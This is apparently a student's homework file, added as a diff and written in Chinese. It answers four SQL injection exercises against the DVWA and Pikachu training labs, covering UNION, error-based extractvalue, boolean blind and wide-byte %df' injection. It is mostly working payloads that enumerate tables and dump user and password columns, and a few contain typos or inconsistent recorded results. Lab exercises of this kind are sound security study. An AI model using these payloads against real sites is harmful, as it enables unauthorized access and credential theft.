@@ -1,0 +1,121 @@
+
+第一题.分别在前端和后端使用 Union 注入实现“dvwa 数据库 -user 表 - 字段 -first_name 数据”的注入过程，写清楚注入步骤。
+    前端注入步骤：  
+    首先，在前端的输入框中输入 1' union all select database(),version()# 可以爆出数据库名.
+    其次，利用information_schema中的tables表结合爆出的dvwa库使用以下语句可以爆出两个表名（guestbook，users）  
+       1' union all select table_name,2  from information_schema.tables where table_schema = 'dvwa'#
+    再次，利用以上爆出的库名和表结合一下语句可以爆出字段名称（user_id,first_name,last_name,user,password,avatar,last_login,failed_login）
+       1' union all select group_concat(column_name),2 from information_schema.columns where table_schema = 'dvwa' and table_name= 'users' #
+    最后，利用以上爆出的信息可以获取到结合一下句子可以在前端显示出first_name数据:
+       1'  union all select user,password from users #
+    后端注入步骤：
+    库名：
+    表名：爆出两个表名（guestbook，users）
+       SELECT first_name, last_name FROM users WHERE user_id = 1 union all select table_name,2  from information_schema.tables where table_schema = 'dvwa';
+    字段：user_id,first_name,last_name,user,password,avatar,last_login,failed_login
+       SELECT first_name, last_name FROM users WHERE user_id = 1 union all select group_concat(column_name),2 from information_schema.columns where table_schema = 'dvwa' and table_name= 'users';
+    first_name 数据
+        SELECT first_name FROM users where user_id=1  union all select user from users;
+
+第二题.分别在前端和后端使用报错注入实现“dvwa 数据库 -user 表 - 字段”的注入过程，写清楚注入步骤，并回答下列关于报错注入的问题：
+  1.在 extractvalue 函数中，为什么’~'写在参数 1 的位置不报错，而写在参数 2 的位置报错？
+     在extractvalue函数中，参数1表示要提取值的XML片段，参数2表示要提取的XPath路径,由于~是一个无效的路径表达式，所以会报错。
+  2.报错注入中，为什么要突破单引号的限制，如何突破？
+    在报错注入中，突破单引号的限制是为了能够成功构造恶意的SQL语句，从而触发数据库错误并获取敏感信息
+    使用双重单引号，使用字符编码，使用其他引号符号突破单引号限制
+  3.在报错注入过程中，为什么要进行报错，是哪种类型的报错？
+    在报错注入过程中，进行报错是为了通过触发数据库错误来获取有关数据库结构和数据的信息，
+    1）、数据库语法错误，并且有返回值
+    2）、数据类型错误，触发数据类型错误，从而返回错误信息中包含数据库结构的相关信息。
+  4.爆破步骤
+   前端注入步骤
+      首先，在前端的输入框中输入1' and extractvalue(1,concat(0x7e,database()))# 可以爆出数据库名dvwa.
+      其次，利用在上个步骤中爆出的数据库名结合以下语句可以爆出数据库表个数量
+      1' and extractvalue(1,concat(0x7e,(select count(table_name) from information_schema.tables where table_schema='dvwa')))#
+      再次，利用上个步骤爆出的表的数量结合以下语句可以展示出相关的表的名称
+      1' and extractvalue (1,concat(0x7e,(select table_name from information_schema.tables where table_schema='dvwa' limit 1,1)))#;
+      再次，利用上个步骤爆出的表的名称结合以下语句可爆出列名
+      1' and extractvalue (1,concat(0x7e,(select column_name from information_schema.columns where table_schema = 'dvwa' and table_name = 'users' limit 0,1))) #
+      最后利用上个步骤爆出的列名结合以下语句可以爆出具体的数据
+      1' and extractvalue (1,concat(0x7e,(select concat(user,password) from users where user_id = 1)))#;--爆出具体数据
+   后端语句：
+      SELECT first_name, last_name FROM users WHERE user_id = 1 and extractvalue(1,concat(0x7e.database()))
+      SELECT first_name, last_name FROM users WHERE user_id = 1 and extractvalue(1,concat(0x7e,(select count(table_name) from information_schema.tables where table_schema='dvwa')))--爆表数
+      SELECT first_name, last_name FROM users WHERE user_id = 1 and extractvalue (1,concat(0x7e,(select table_name from information_schema.tables where table_schema='dvwa' limit 1,1)));--爆表名
+      SELECT first_name, last_name FROM users WHERE user_id = 1 and extractvalue (1,concat(0x7e,(select column_name from information_schema.columns where table_schema = 'dvwa' and table_name = 'users' limit 0,1)));--爆列名
+      SELECT first_name, last_name FROM users WHERE user_id = 1 and extractvalue (1,concat(0x7e,(select  concat(user,password) from users where user_id = 1)));--爆出具体数据
+
+第三题.任选布尔盲注或者时间盲注在前端和后端实现“库名 - 表名 - 列名”的注入过程，写清楚注入步骤。
+   前端注入步骤：
+      1 首先判断数据库的长度是4
+          1' and  length (database()) >1 # 返回exists 证明存在
+          1' and  length (database()) >5 # 返回missing证明不存在
+          1' and  length (database()) >3 # 返回exists证明存在
+          1' and  length (database()) >4 # 返回missing证明不存在
+          1' and  length (database()) =3 # 返回missing证明不存在
+          1' and  length (database()) =4 # 
+      2. 通过以下语句判断数据库所名称的字符组成元素（dvwa)
+          1' and  ascii (substr(database(),1,1)) >50#;有返回数据 
+          1' and  ascii (substr(database(),1,1)) >100#; 没有返回数据
+          1' and  ascii (substr(database(),1,1)) >80#; 有返回数据
+          1' and  ascii (substr(database(),1,1)) >90#; 有返回数据
+          1' and  ascii (substr(database(),1,1)) >95#; 有返回数据
+          1' and  ascii (substr(database(),1,1)) >99#; 有返回数据
+          1' and  ascii (substr(database(),1,1)) =100#; 有返回数据，通过ascii证明这个是d
+          1' and  ascii (substr(database(),1,1)) >115#; 有返回数据
+          1' and  ascii (substr(database(),1,1)) >116#; 有返回数据
+          1' and  ascii (substr(database(),1,1)) >118#; 有返回数据
+          1' and  ascii (substr(database(),1,1)) >117#; 有返回数据
+          1' and  ascii (substr(database(),1,1)) =110#; 有返回数据，通过ascii证明这个是v
+          1' and ascii(substr(database(),3,1))=119;# 通过ascii证明这个是w
+          1' and ascii(substr(database(),4,1))=97;# 通过ascii证明这个是a
+      3. 通过以下语句判断表的个数和表名
+          1' and (select count(table_name) from information_schema.tables where table_schema=database())=2# 判断表的个数是2个
+          1' and length((select table_name from information_schema.tables where table_schema = database() limit 0,1)) > 10# 没有返回数据
+          1' and length((select table_name from information_schema.tables where table_schema = database() limit 0,1)) > 5#有返回数据
+          1' and length((select table_name from information_schema.tables where table_schema = database() limit 0,1)) > 8# 有返回数据
+          1' and length((select table_name from information_schema.tables where table_schema = database() limit 0,1)) > 9# 没有返回数据
+          1' and length((select table_name from information_schema.tables where table_schema = database() limit 0,1)) =9# 有返回数据证明表名的长度是9
+          1' and  ascii(substr((select table_name from information_schema.tables where table_schema = database() limit 0,1),1,1)) >110# 没有返回数据
+          1' and  ascii(substr((select table_name from information_schema.tables where table_schema = database() limit 0,1),1,1)) >105# 没有返回数据
+          1' and  ascii(substr((select table_name from information_schema.tables where table_schema = database() limit 0,1),1,1)) >104# 没有返回数据
+          1' and  ascii(substr((select table_name from information_schema.tables where table_schema = database() limit 0,1),1,1)) >103# 没有返回数据
+          1' and  ascii(substr((select table_name from information_schema.tables where table_schema = database() limit 0,1),1,1)) >102# 有返回数据
+          1' and  ascii(substr((select table_name from information_schema.tables where table_schema = database() limit 0,1),1,1)) =103#; 有返回数据，对照asci码表可以获取到字符是g
+         以此类推2,3,4,5,6,7,8,9的字符分别是多少
+   后端注入步骤：
+        SELECT first_name, last_name FROM users WHERE user_id = 1 and  length (database()) >1  有返回数据
+        SELECT first_name, last_name FROM users WHERE user_id = 1 and  length (database()) >4  没有返回数据
+        SELECT first_name, last_name FROM users WHERE user_id = 1 and  length (database()) >3  有返回数据证明
+        SELECT first_name, last_name FROM users WHERE user_id = 1 and  length (database()) = 4 有返回数据，证明数据库的长度是4
+        SELECT first_name, last_name FROM users WHERE user_id = 1 and  ascii (substr(database(),1,1)) >50; 有返回数据
+        SELECT first_name, last_name FROM users WHERE user_id = 1 and  ascii (substr(database(),1,1)) >100; 没有返回数据
+        SELECT first_name, last_name FROM users WHERE user_id = 1 and  ascii (substr(database(),1,1)) >80; 有返回数据
+        SELECT first_name, last_name FROM users WHERE user_id = 1 and  ascii (substr(database(),1,1)) >90; 有返回数据
+        SELECT first_name, last_name FROM users WHERE user_id = 1 and  ascii (substr(database(),1,1)) >95; 有返回数据
+        SELECT first_name, last_name FROM users WHERE user_id = 1 and  ascii (substr(database(),1,1)) >99; 有返回数据
+        SELECT first_name, last_name FROM users WHERE user_id = 1 and  ascii (substr(database(),1,1)) =100; 有返回数据，通过ascii证明这个是d
+        SELECT first_name, last_name FROM users WHERE user_id = 1 and  ascii (substr(database(),2,1)) >115; 有返回数据
+        SELECT first_name, last_name FROM users WHERE user_id = 1 and  ascii (substr(database(),2,1)) >116; 有返回数据
+        SELECT first_name, last_name FROM users WHERE user_id = 1 and  ascii (substr(database(),2,1)) >118; 没有返回数据
+        SELECT first_name, last_name FROM users WHERE user_id = 1 and  ascii (substr(database(),2,1)) >117; 有返回数据
+        SELECT first_name, last_name FROM users WHERE user_id = 1 and  ascii (substr(database(),2,1)) =118; 有返回数据，通过ascii证明这个是v
+        SELECT first_name, last_name FROM users WHERE user_id = 1 and  ascii (substr(database(),3,1)) =119; 有返回数据，通过ascii证明这个是w
+        SELECT first_name, last_name FROM users WHERE user_id = 1 and  ascii (substr(database(),4,1)) =97; 有返回数据，通过ascii证明这个是a
+        SELECT first_name, last_name FROM users WHERE user_id = 1 and (select count(table_name) from information_schema.tables where table_schema=database())=2;--判断表的个数是2个
+        SELECT first_name, last_name FROM users WHERE user_id = 1 and length((select table_name from information_schema.tables where table_schema = database() limit 0,1)) > 10 没有返回数据
+        SELECT first_name, last_name FROM users WHERE user_id = 1 and length((select table_name from information_schema.tables where table_schema = database() limit 0,1)) > 5 有返回数据
+        SELECT first_name, last_name FROM users WHERE user_id = 1 and length((select table_name from information_schema.tables where table_schema = database() limit 0,1)) > 8 有返回数据
+        SELECT first_name, last_name FROM users WHERE user_id = 1 and length((select table_name from information_schema.tables where table_schema = database() limit 0,1)) > 9 没有返回数据
+        SELECT first_name, last_name FROM users WHERE user_id = 1 and length((select table_name from information_schema.tables where table_schema = database() limit 0,1)) =9  有返回数据证明表名的长度是9
+        SELECT first_name, last_name FROM users WHERE user_id = 1 and  ascii(substr((select table_name from information_schema.tables where table_schema = database() limit 0,1),1,1)) >110 没有返回数据
+        SELECT first_name, last_name FROM users WHERE user_id = 1 and  ascii(substr((select table_name from information_schema.tables where table_schema = database() limit 0,1),1,1)) >105 没有返回数据
+        SELECT first_name, last_name FROM users WHERE user_id = 1 and  ascii(substr((select table_name from information_schema.tables where table_schema = database() limit 0,1),1,1)) >104 没有返回数据
+        SELECT first_name, last_name FROM users WHERE user_id = 1 and  ascii(substr((select table_name from information_schema.tables where table_schema = database() limit 0,1),1,1)) >103 没有返回数据
+        SELECT first_name, last_name FROM users WHERE user_id = 1 and  ascii(substr((select table_name from information_schema.tables where table_schema = database() limit 0,1),1,1)) >102 有返回数据
+        SELECT first_name, last_name FROM users WHERE user_id = 1 and  ascii(substr((select table_name from information_schema.tables where table_schema = database() limit 0,1),1,1)) =103; 有返回数据，对照asci码表可以获取到字符是g
+        以此类推2,3,4,5,6,7,8,9的字符分别是多少
+第四题.利用宽字节注入实现“库名 - 表名 - 列名”的注入过程，写清楚注入步骤。
+       获取数据库名输入：%df' union select database(),version()#&submit=%E6%9F%A5%E8%AF%A2可知数据库名是pikachu ,版本是5.7.26
+       获取表名：   %df' union select table_schema,table_name from information_schema.tables where table_schema='pikachu'# ，从结果我们可知：pikachu数据库里有 httpinfo、member、message、users、xssblind这五个表，且我们可以猜测管理员的账号密码可能放在users这个表里
+       获取列名：   %df' union select table_name,column_name from information_schema.columns where table_name='users'#，从结果我们可以看到有两个重要字段（列）：username、password，即账号和密码
